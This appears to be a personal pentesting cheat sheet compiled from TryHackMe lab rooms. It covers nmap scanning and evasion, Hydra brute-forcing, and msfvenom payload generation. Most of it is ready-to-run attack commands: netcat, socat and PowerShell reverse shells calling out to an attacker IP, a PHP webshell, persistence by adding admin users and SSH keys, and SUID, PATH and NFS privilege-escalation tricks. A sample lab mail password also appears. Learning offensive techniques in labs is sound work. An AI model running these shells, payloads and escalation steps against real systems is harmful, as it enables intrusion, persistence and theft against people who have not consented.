# ETH
===============================================================================
# Passive Reconnaissance
```
DNS

Lookup WHOIS record	whois tryhackme.com
Lookup DNS A records	nslookup -type=A tryhackme.com
Lookup DNS MX records at DNS server	nslookup -type=MX tryhackme.com 1.1.1.1
Lookup DNS TXT records	nslookup -type=TXT tryhackme.com
Lookup DNS A records	dig tryhackme.com A
Lookup DNS MX records at DNS server	dig @1.1.1.1 tryhackme.com MX
Lookup DNS TXT records	dig tryhackme.com TXT

DNSDumpster
shodan.io
```
===============================================================================
# Active Reconnaissance
```
FoxyProxy lets you quickly change the proxy server you are using to access the target website. This browser extension is convenient when you are using a tool such as Burp Suite or if you need to switch proxy servers regularly. You can get FoxyProxy for Firefox from here.
User-Agent Switcher and Manager gives you the ability to pretend to be accessing the webpage from a different operating system or different web browser. In other words, you can pretend to be browsing a site using an iPhone when in fact, you are accessing it from Mozilla Firefox. You can download User-Agent Switcher and Manager for Firefox here.
Wappalyzer provides insights about the technologies used on the visited websites. Such extension is handy, primarily when you collect all this information while browsing the website like any other user. A screenshot of Wappalyzer is shown below. You can find Wappalyzer for Firefox here.


telnet banner grabbing:
telnet <ip> <port>			# or nc (netcat)
GET / HTTP/1.1				# or GET /<page>.html
host: example (any name)		# enter twice


netcat

nc -lvnp 1234				# our machine
-l	Listen mode
-p	Specify the Port number
-n	Numeric only; no resolution of hostnames via DNS
-v	Verbose output (optional, yet useful to discover any bugs)
-vv	Very Verbose (optional)
-k	Keep listening after client disconnects


nc 10.10.32.147 1234			# target machine

```

===============================================================================
# Nmap Live Host Discovery

```
-----------------------
ARP scan: This scan uses ARP requests to discover live hosts
ICMP scan: This scan uses ICMP requests to identify live hosts
TCP/UDP ping scan: This scan sends packets to TCP ports and UDP ports to determine live hosts.
Using Reverse-DNS Lookup

When a privileged user tries to scan targets on a local network (Ethernet), Nmap uses ARP requests. A privileged user is root or a user who belongs to sudoers and can run sudo.
When a privileged user tries to scan targets outside the local network, Nmap uses ICMP echo requests, TCP ACK (Acknowledge) to port 80, TCP SYN (Synchronize) to port 443, and ICMP timestamp request.
When an unprivileged user tries to scan targets outside the local network, Nmap resorts to a TCP 3-way handshake by sending SYN packets to ports 80 and 443.

-----------------------
# add scan targets:
list: MACHINE_IP scanme.nmap.org example.com will scan 3 IP addresses.
range: 10.11.12.15-20 will scan 6 IP addresses: 10.11.12.15, 10.11.12.16,… and 10.11.12.20.
subnet: MACHINE_IP/30 will scan 4 IP addresses.
file: nmap -iL list_of_hosts.txt


nmap -sL TARGETS			# list the scan targets - use -n to avoid reverse-DNS resolution - useful for scripting
					# giving the list without scanning them

-----------------------
# Nmap Host Discovery Using ARP

nmap -sn TARGETS			# host discovery only, disable scan ports. (ICMP)
nmap -PR -sn TARGETS			# only to perform an ARP scan without port-scanning (ONLY on same subnet)


-----------------------
# Nmap Host Discovery Using ICMP

ICMP Echo Request (-PE -sn <<no port scan>>)
Sends ICMP Echo Requests and waits for replies.
Example: sudo nmap -PE -sn MACHINE_IP/24
Some devices may block ICMP, so not all live hosts will respond.

ICMP Timestamp Request (-PP -sn <<no port scan>>)
Uses ICMP Timestamp Requests instead of Echo Requests.
Example: sudo nmap -PP -sn MACHINE_IP/24
Can bypass some firewalls that block normal ICMP pings.

ICMP Address Mask Request (-PM -sn <<no port scan>>)
Uses ICMP Address Mask queries.
Example: sudo nmap -PM -sn MACHINE_IP/24
Often blocked by firewalls, making it unreliable.

-----------------------
# Nmap Host Discovery Using TCP and UDP

# still using -sn to say disable port scanning and perform only host discovery 

sudo nmap -PS 80 -sn MACHINE_IP/24	# SYN scan, SYN/ACK (online), RST (off - block)
sudo nmap -PA 80 -sn MACHINE_IP/24	# ACK scan, RST (online)
sudo nmap -PU -sn MACHINE_IP/24		# UDP scan


Alternative:
masscan MACHINE_IP/24 -p443
masscan MACHINE_IP/24 -p80,443
masscan MACHINE_IP/24 -p22-25
masscan MACHINE_IP/24 ‐‐top-ports 100

-----------------------
Using Reverse-DNS Lookup

# by default use reverse-DNS 		# disable by -n
# -R to query the DNS server even for offline hosts
# --dns-servers DNS_SERVER		# specific server

```

===============================================================================
# Nmap Basic Port Scans
```
-----------------------
Open: indicates that a service is listening on the specified port.
Closed: indicates that no service is listening on the specified port, although the port is accessible. By accessible, we mean that it is reachable and is not blocked by a firewall or other security appliances/programs.
Filtered: means that Nmap cannot determine if the port is open or closed because the port is not accessible. This state is usually due to a firewall preventing Nmap from reaching that port. Nmap’s packets may be blocked from reaching the port; alternatively, the responses are blocked from reaching Nmap’s host.
Unfiltered: means that Nmap cannot determine if the port is open or closed, although the port is accessible. This state is encountered when using an ACK scan -sA.
Open|Filtered: This means that Nmap cannot determine whether the port is open or filtered.
Closed|Filtered: This means that Nmap cannot decide whether a port is closed or filtered.

-----------------------
TCP Connect Scan
nmap -sT 10.10.49.251			# Port scan by establishing a full TCP connection
					# SYN, SYN/ACK, ACK
-----------------------
TCP SYN Scan
nmap -sS 10.10.49.251			# not establishing the connection, (best)
					# SYN, SYN/ACK, RST
-----------------------
UDP Scan
nmap -sU 10.10.49.251

-----------------------
-p-					# all ports
-p1-1023				# scan ports 1 to 1023
-F					# 100 most common ports
-r					# scan ports in consecutive order
-T<0-5>					# -T0 being the slowest and T5 the fastest
--max-rate 50				# rate <= 50, packets/sec to send
--min-rate 15				# rate >= 15, packets/sec to send
--min-parallelism 100			# at least 100 probes in parallel
```
===============================================================================

# Nmap Advanced Port Scans 
```
-----------------------
TCP Null Scan, FIN Scan, and Xmas Scan

Null Scan (-sN), Sends a TCP packet with no flags set.
(-sF), Sends a TCP packet with only the FIN flag.
(-sX), Sends a TCP packet with FIN, PSH, and URG flags

If the port is open, there is no response.
If the port is closed, the target sends an RST packet.
Result: Ports are identified as open|filtered (either open or blocked by a firewall).

Stateless firewalls may let these scans pass, Stateful firewalls will block these scans

-----------------------
TCP Maimon Scan, Uses FIN and ACK flags in TCP packets.
Most modern BSD-based systems always respond with RST, making the scan ineffective for detecting open ports.

-----------------------
TCP ACK, Window, and Custom Scan

ACK (-sA) and Window (-sW) scans help map firewall rules, not services.

1. TCP ACK Scan (-sA)
The target always responds with an RST, regardless of port state.
Purpose: Identifies which ports are not blocked by a firewall.

2. TCP Window Scan (-sW)
Works like an ACK scan but analyzes the TCP window field in RST packets returned.
Some systems return different values based on port state, revealing open ports.
Without a firewall: No extra information is gained.
Behind a firewall: Can differentiate closed vs. unfiltered ports, providing more insights than ACK scans.

3. Custom Scan (--scanflags), Allows users to set custom TCP flag combinations (e.g., SYN, RST, and FIN).

-----------------------
Spoofing and Decoys

1. Spoofing an IP Address
You can fake your IP address when scanning a target.
However, you won’t receive responses unless you can monitor the network traffic.

nmap -e NET_INTERFACE -Pn -S SPOOFED_IP 10.10.23.74
-e NET_INTERFACE: Specifies the network interface.
-Pn: Disables ping check.
-S SPOOFED_IP: Uses a fake source IP.

2. Spoofing a MAC Address
Possible only if the attacker and target are on the same local network (Ethernet or WiFi).
nmap --spoof-mac SPOOFED_MAC 10.10.23.74

3. Using Decoys to Hide Your IP between multiple different IPs
nmap -D 10.10.0.1,10.10.0.2,ME 10.10.23.74
nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME 10.10.23.74		# (add random IPs)

-----------------------
Fragmented Packets

1. Packet Fragmentation (-f Option in Nmap)
Divides packets into smaller parts to evade firewalls and IDS.

nmap -sS -p80 -f 10.20.30.144

Breaks TCP headers into 8-byte fragments for stealth scanning.
Adding -ff (or -f -f) increases fragment size to 16 bytes.
Custom fragment size can be set using --mtu (must be a multiple of 8).

2. Increasing Packet Size for Stealth
Instead of fragmenting, you can make packets look normal by adding extra data.

nmap --data-length NUM 10.20.30.144				# NUM defines extra random bytes to make the scan less suspicious.


-----------------------
Idle/Zombie Scan
nmap -sI ZOMBIE_IP TARGET_IP					# using a zombie and compare its IP ID

-----------------------
Getting More Details

--reason				# explains how Nmap made its conclusion
-v					# verbose
-vv					# very verbose
-d					# debugging
-dd					# more details for debugging
```

===============================================================================
# Nmap Post Port Scans
```
-----------------------
Service Detection (-sV)
nmap -sV TARGET_IP
You can adjust scan intensity using --version-intensity LEVEL (0 = light, 9 = full).
--version-light → Level 2 (faster, less detail).
--version-all → Level 9 (more thorough, slower).

-----------------------
nmap -sS -O TARGET_IP				# OS
nmap -sS --traceroute TARGET_IP			# tracerout

-----------------------
Nmap Scripting Engine (NSE)

nmap -sS -sC TARGET_IP				# Default scripts
nmap -sS --script "SCRIPT-NAME" TARGET_IP	# Specific scripts
nmap --script "ftp*"				# Wildcard scripts

Category	Purpose
auth		Checks authentication methods
brute		Performs brute-force attacks
discovery	Finds network info like DNS records
exploit		Attempts exploits on vulnerabilities
malware		Detects backdoors/malware
safe		Runs harmless scans
vuln		Detects vulnerabilities
broadcast	Discover hosts by sending broadcast messages
dos		Detects servers vulnerable to Denial of Service (DoS)
external	Checks using a third-party service, such as Geoplugin and Virustotal
fuzzer		Launch fuzzing attacks
intrusive	Intrusive scripts such as brute-force attacks and exploitation
version		Retrieve service versions

-----------------------
Saving the Output

Normal (-oN)		Looks like the default screen output (not good for grep)
Grepable (-oG)		good for searching with grep	
XML (-oX)		good for importing into tools	
All (-oA)		Saving in all formats	
Script Kiddie (-oS)	Joke format (not useful)
```

===============================================================================
# Protocols and Servers
```
-----------------------
FTP
SYST – Shows the system type (e.g., UNIX).
PASV – Switches to passive mode.
TYPE A – ASCII mode for text files.
TYPE I – Binary mode for non-text files.
ls – Lists files in the directory.
get FILENAME – Downloads a file.

connect to ftp server using telnet:		# can run command, can't transfer files
telnet <IP> 21
USER <username>
PASS <password>

-----------------------
SMTP

Mail transfer:
Mail User Agent (MUA): The email client (e.g., Outlook, Gmail) that sends and receives emails.
Mail Submission Agent (MSA): Accepts outgoing emails, checks for errors, and forwards them.
Mail Transfer Agent (MTA): Routes the email from the sender’s server to the recipient’s server.
Mail Delivery Agent (MDA): Delivers the email to the recipient’s inbox.

SMTP works between the MUA and MSA to send emails and between MTAs to transfer emails.

-----------------------
POP3

POP3 and IMAP works between the MUA and MDA to retrieve emails from the mail server.

telnet 10.10.223.111 110  # Connect to the POP3 server on port 110  
USER frank                # Provide username  
PASS D2xc9CgD             # Provide password  
STAT                      # Check the number of messages  
LIST                      # List available messages  
RETR 1                    # Retrieve the first email  
QUIT                      # Close the connection  

-----------------------
IMAP

Keeps emails synchronized across multiple devices (e.g., phone, laptop).

telnet 10.10.223.111 143  # Connect to the IMAP server on port 143  
c1 LOGIN frank D2xc9CgD    # Authenticate with username and password  
c2 LIST "" "*"            # List mail folders  
c3 EXAMINE INBOX          # Check for new messages  
c4 LOGOUT                 # Close the connection  



```


===============================================================================
# Protocols and Servers 2
```
-----------------------
sudo tcpdump port 110 -A				# -A (ASCII)

-----------------------
Tools Used for MITM Attacks
Ettercap – Network security tool designed for MITM attacks.
Bettercap – Advanced tool for network attacks and traffic manipulation.

-----------------------
Password attack:

Hydra:
hydra -l username -P wordlist.txt server service
hydra -l lazie -P /usr/share/wordlists/rockyou.txt 10.10.197.186 imap

-l username → Specifies the username.
-P wordlist.txt → Specifies the password list.
server → The target's IP or hostname.
service → The target protocol (e.g., FTP, SSH).

other:
-s PORT → Specify a non-default port.
-V or -vV → Verbose mode (shows attempted combinations).
-t n → Number of parallel connections (e.g., -t 16 for 16 threads).
-d → Debugging mode for troubleshooting.
-L -> user list (users.txt)

```

===============================================================================
# 
```
msfconsole: The main command-line interface.
Modules: supporting modules such as exploits, scanners, payloads, etc.
Tools: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset. We will cover msfvenom within this module, but pattern_create and pattern_offset are tools useful in exploit development which is beyond the scope of this module.


Auxiliary: Any supporting module, such as scanners, crawlers and fuzzers, can be found here.
/opt/metasploit-framework/embedded/framework/modules# tree -L 1 auxiliary/

Encoders: Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 encoders/

Evasion: While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. On the other hand, “evasion” modules will try that, with more or less success.
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 2 evasion/

Payloads: Payloads are codes that will run on the target system.

Exploits will leverage a vulnerability on the target system, but to achieve the desired result, we will need a payload.  Examples could be; getting a shell, loading a malware or backdoor to the target system, running a command, or launching calc.exe as a proof of concept to add to the penetration test report


Adapters: An adapter wraps single payloads to convert them into different formats. For example, a normal single payload can be wrapped inside a Powershell adapter, which will make a single powershell command that will execute the payload.
Singles: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
Stagers: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
Stages: Downloaded by the stager. This will allow you to use larger sized payloads.

Post: Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.


he show command can be used in any context followed by a module type (auxiliary, payload, exploit, etc.) to list available modules.
You can leave the context using the back command.
info command
Search
use
set
run = exploit 

You can direct the search function using keywords such as type and platform.



For example, if we wanted our search results to only include auxiliary modules, we could set the type to auxiliary. The screenshot below shows the output of the search type:auxiliary telnet command.


SESSION: Each connection established to the target system using Metasploit will have a session ID. You will use this with post-exploitation modules that will connect to the target system using an existing connection.
You can override any set parameter using the set command again with a different value. You can also clear any parameter value using the unset command or clear all set parameters with the unset all command.


You can use the setg command to set values that will be used for all modules.
You can clear any value set with setg using unsetg.


The exploit command can be used without any parameters or using the “-z” parameter.

The exploit -z command will run the exploit and background the session as soon as it opens.

This will return you the context prompt from which you have run the exploit.

Some modules support the check option. This will check if the target system is vulnerable without exploiting it.


Sessions
Once a vulnerability has been successfully exploited, a session will be created. This is the communication channel established between the target system and Metasploit.



You can use the background command to background the session prompt and go back to the msfconsole prompt.



Alternatively, CTRL+Z can be used to background sessions.

The sessions command can be used from the msfconsole prompt or any context to see the existing sessions.



To interact with any session, you can use the sessions -i command followed by the desired session number.

```

#
```
search portscan

msfvenom -l payloads 
msfvenom --list formats


msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64

msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php

Linux Executable and Linkable Format (elf)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf



Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe

PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php

ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp

Python
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py

```




# Bleu
```
nmap -sV -sC --script vuln <target ip>
use post/multi/manage/shell_to_meterpreter






```
===============================================================================
# 

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.46.125		# finding smb shares
smbclient //10.10.46.125/anonymous							# connect to the share			
smbget -R smb://10.10.46.125/anonymous							#  recursively download the SMB share
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.210.146			# |find nfs shares by scanning rpcbind|

mkdir /mnt/kenobiNFS
mount MACHINE_IP:/var /mnt/kenobiNFS

SUID Bit	User executes the file with permissions of the file owner
SGID Bit	User executes the file with the permission of the group owner.

find / -perm -u=s -type f 2>/dev/null
find /: Start searching from the root directory.
-perm -u=s: Look for files with the user SUID bit set.
-type f: Only show files (not directories).
2>/dev/null: Hide permission denied errors.

This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

# we can spoof a path
echo /bin/sh > curl
chmod 777 curl
export PATH=/path/to/spoofed_curl:$PATH		# add my path to the variable as the first path to look before other paths



echo $PATH
/usr/bin:/home/naqib/bin
 	# add the variable as the last path

```

===============================================================================
# What the Shell
```
----------------------------------------
# Netcat Reverse & Bind Shells
1. Reverse Shell (if nc supports -e):
   nc <ATTACKER-IP> <PORT> -e /bin/bash			# target machine
   sudo nc -lvnp <PORT>					# attacker machine

2. Bind Shell (if nc supports -e):
   nc -lvnp <PORT> -e /bin/bash				# target machine
   nc <Target-IP> <PORT>				# attacker machine

3. Reverse Shell (no -e support):
   mkfifo /tmp/f; nc <ATTACKER-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
Or:
   nc <ATTACKER-IP> <PORT>

4. Bind Shell (no -e support):
   mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

# the nc.exe binary: /usr/share/windows-resources/binaries

----------------------------------------
# Windows PowerShell Reverse Shell (One-liner)
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# URL Encoded version (for webshell GET requests):
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B...

----------------------------------------
# PHP Webshell
kali: /usr/share/webshells

<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
# Access via:
http://<target-ip>/webshell.php?cmd=whoami



----------------------------------------
# Shell Stabilization (Linux)
1. python
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   export TERM=xterm
   Ctrl + Z
   stty raw -echo; fg				# turn off our terminal echo (we can use tab, ctrl + c,...)

2. Fix display:
   stty -a					# on another terminal get values of rows and coumns
   stty rows <rows>			# match your terminal size
   stty cols <number>

3. If terminal breaks (after crash):
   reset

4. Use rlwrap to enhance netcat listener specialy for Windows:
   sudo apt install rlwrap
   rlwrap nc -lvnp <PORT>			# for Linux, also (stty raw -echo; fg)

----------------------------------------
# Socat Shells

1. Reverse Shell
   socat TCP-L:<PORT> -						# Listener
   socat TCP:<ATTACKER-IP>:<PORT> EXEC:"bash -li"		# on Linux target 
   socat TCP:<ATTACKER-IP>:<PORT> EXEC:powershell.exe,pipes	# on windows target 


2. Bind Shell (Linux):
   socat TCP-L:<PORT> EXEC:"bash -li"				# Listener on target
   socat TCP-L:<PORT> EXEC:powershell.exe,pipes			# Windows
   socat TCP:<TARGET-IP>:<PORT> -				# Linux

----------------------------------------
# Stable Linux TTY Shell using Socat

# On attacker machine (Listener):
socat TCP-L:<PORT> FILE:`tty`,raw,echo=0		# then the target needs the socat binary for connecting to it

# Target:
socat TCP:<ATTACKER-IP>:<PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane				

----------------------------------------
# Encrypted Shells using Socat (OpenSSL)
1. Generate cert:
   openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

2. Combine:
   cat shell.key shell.crt > shell.pem

# use OPENSSL-LISTEN instead of TCP-L
# Reverse Shell:
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -		# On our machine
socat OPENSSL:<ATTACKER-IP>:<PORT>,verify=0 EXEC:/bin/bash	# On Target

# Bind Shell (Windows):
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
socat OPENSSL:<TARGET-IP>:<PORT>,verify=0 -

----------------------------------------
# msfvenom Basics
# Syntax:
msfvenom -p <PAYLOAD> -f <FORMAT> -o <FILENAME> LHOST=<IP> LPORT=<PORT>

# Example:
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.10.10.10 LPORT=4444

# List payloads:
msfvenom --list payloads

# List output formats:
msfvenom --list formats

----------------------------------------
# Staged vs Stageless Payloads
1. Staged:
   - Two parts: small stager connects back and downloads payload
   - Less detectable, harder to use
   - Requires Metasploit multi/handler
   - Format: `windows/x64/meterpreter/reverse_tcp`

2. Stageless:
   - All in one
   - Heavier, easier to detect
   - Easier to use, more common in simple shells
   - Format: `windows/x64/meterpreter_reverse_tcp`

3. Naming:
   - Slash `/` = staged
   - Underscore `_` = stageless
   - Format: <OS>/<arch>/<payload>

----------------------------------------
# Metasploit Multi/Handler
1. Start Metasploit:
   msfconsole

2. Use handler module:
   use exploit/multi/handler

3. Set required options:
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST <your-IP>
   set LPORT <your-port>

4. Start listener:
   exploit -j					# background job

5. Manage sessions:
   sessions						# show all
   sessions -i <id>				# interact with session

6. Other commands:
   background					# background active session
   Ctrl + Z						# same as above

----------------------------------------
# Post-Exploitation (Persistence & Users)
# Windows (must be admin or SYSTEM):
net user <username> <password> /add
net localgroup administrators <username> /add

# Linux (must be root or sudo):
useradd -m <username>
echo '<username>:<password>' | chpasswd
usermod -aG sudo <username>

# Add SSH Key (Linux):
mkdir /home/<user>/.ssh
echo "<your-public-key>" > /home/<user>/.ssh/authorized_keys
chmod 600 /home/<user>/.ssh/authorized_keys
chown -R <user>:<user> /home/<user>/.ssh
```

===============================================================================
# Burp Suite: Other Modules
```
URL Encoding: It replaces special characters with % followed by their ASCII hex value. / becomes %2F.
HTML Encoding: & + character code or name + ; (&quot;)
Smart Decode: auto decode (like cyberchef Magic)

```

===============================================================================
# Linux Privilege Escalation
```
----------------------------------------
# Enumeration

hostname                                              # Show system hostname
uname -a                                              # Show detailed system info (kernel, architecture)
cat /proc/version                                     # Show kernel version and compiler info
cat /etc/issue                                        # Show OS version (customizable)

ps                                                   # Show current user’s running processes
ps -A                                                # Show all running processes
ps aux                                               # Show all processes with user and TTY info
ps axjf                                              # Show process tree

env                                                  # Show environment variables

sudo -l                                              # List commands user can run with sudo
id                                                   # Show current user ID and groups
id username                                          # Show ID info of another user

ls -la                                               # List all files with permissions, including hidden
cat /etc/passwd                                      # List system users
grep home /etc/passwd                                # List normal users with home directories
history                                              # Show user’s previous commands

ifconfig                                             # Show network interfaces
ip route                                             # Show routing table

netstat -a                                           # Show all connections and listening ports
netstat -at                                          # Show all TCP connections
netstat -au                                          # Show all UDP connections
netstat -l                                           # Show listening ports
netstat -lt                                          # Show listening TCP ports
netstat -s                                           # Show protocol statistics
netstat -tp                                          # Show PID and program name of TCP connections
netstat -tp -l                                       # Show listening TCP ports with program info
netstat -i                                           # Show interface stats
netstat -ano                                         # Show all sockets with numeric IP and timers


find / -type f 2>/dev/null                           # Find all files, ignore errors
find . -name flag1.txt                               # Find file named flag1.txt in current dir
find /home -name flag1.txt                           # Find file in /home
find / -type d -name config                          # Find directory named config
find / -type f -perm 0777                            # Find world-readable/writable/executable files
find / -perm a=x                                     # Find executable files (a=all)
find /home -user frank                               # Find files owned by user frank
find / -mtime 10                                     # Find files modified in last 10 days
find / -atime 10                                     # Find files accessed in last 10 days
find / -cmin -60                                     # Files changed within last hour
find / -amin -60                                     # Files accessed within last hour
find / -size 50M                                     # Find files of 50MB
find / -size +100M                                   # Find files larger than 100MB

find / -writable -type d 2>/dev/null                 # Find writable directories (for current user)
find / -writable 2>/dev/null			     # find writable folders
find / -perm -222 -type d 2>/dev/null                # Find directories with write permission
find / -perm -o=w -type d 2>/dev/null                # Find world-writable dirs
find / -perm -o=x -type d 2>/dev/null                # Find world-executable dirs.
find / -perm -ug=w -perm -o=x -type d 2>/dev/null               
u = user (owner), g = group, o = others, a = all

find / -name perl*                                   # Find Perl installations

find / -perm -u=s -type f 2>/dev/null                # Find SUID files (run as file owner)
find / -type f -perm -04000 -ls 2>/dev/null		# list file with suid and sgid set

----------------------------------------
Automated Enumeration Tools

LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
LinEnum: https://github.com/rebootuser/LinEnum
LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
Linux Priv Checker: https://github.com/linted/linuxprivchecker

----------------------------------------
Privilege Escalation: Kernel Exploits

https://gtfobins.github.io/

----------------------------------------
Privilege Escalation: SUID

GTFOBins

SUID Bit	User executes the file with permissions of the file owner
SGID Bit	User executes the file with the permission of the group owner.

find / -type f -perm -04000 -ls 2>/dev/null		# list file with suid and sgid set
find / -perm -u=s -type f 2>/dev/null

find /: Start searching from the root directory.
-perm -u=s: Look for files with the user SUID bit set.
-type f: Only show files (not directories).
-ls: list them like ls -l
2>/dev/null: Hide permission denied errors.

----------------------------------------
Privilege Escalation: Capabilities

System administrators can give special privileges to a binary using something called “Capabilities.”
This allows a program to perform certain actions (like opening network sockets) without needing full root access.
See GTFOBins for Capabilities

getcap -r / 2>/dev/null                           # List all files with capabilities, ignore errors

----------------------------------------
cron

Cron jobs run scripts or commands at scheduled times with the owner's privileges (e.g., root).
If the scheduled script is writable or missing, replace it with a reverse shell script.
GTFOBins and wildcard exploits (e.g., in tar, rsync) can also be useful in cron job abuse.

cat /etc/crontab 				# View system-wide cron jobs
crontab -l 					# View current user's cron jobs
/var/spool/cron/crontabs/username		# path to user crontabs

----------------------------------------
Privilege Escalation: PATH

Linux uses the PATH environment variable to decide where to look for commands.

If a script runs a command like thm without an absolute path, Linux looks in each folder listed in $PATH.

If any folder in $PATH is writable, a low-privilege user can place a fake binary (e.g., a script or copy of /bin/bash) and trick a SUID-root binary or script to run it as root.

What folders are listed in $PATH?
Can you write to any of those folders?
Can you modify $PATH?
Is there a vulnerable SUID binary/script calling a command without full path?

echo $PATH                                           # Show current PATH
find / -writable 2>/dev/null                         # List all writable folders
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u    # Cleaned writable folders
export PATH=/tmp:$PATH                               # Prepend /tmp to PATH
cp /bin/bash /tmp/thm && chmod +x /tmp/thm           # Create fake 'thm' binary in /tmp

# we can spoof a path
echo /bin/sh > curl
chmod 777 curl
export PATH=/path/to/spoofed_curl:$PATH		# add my path to the variable as the first path to look before other paths



echo $PATH
/usr/bin:/home/naqib/bin		 	# add the variable as the last path

----------------------------------------
NFS

/etc/exports                                      		# NFS configuration file

showmount -e <target-ip>                           		# List NFS shares on target
mount <target-ip>:/shared /mnt/nfs                 		# Mount the NFS share
echo 'int main() { setuid(0); system("/bin/bash"); }' > nfs.c   # Write C code
gcc nfs.c -o nfs                                    		# Compile to binary
chmod +s nfs                                        		# Set SUID bit





```
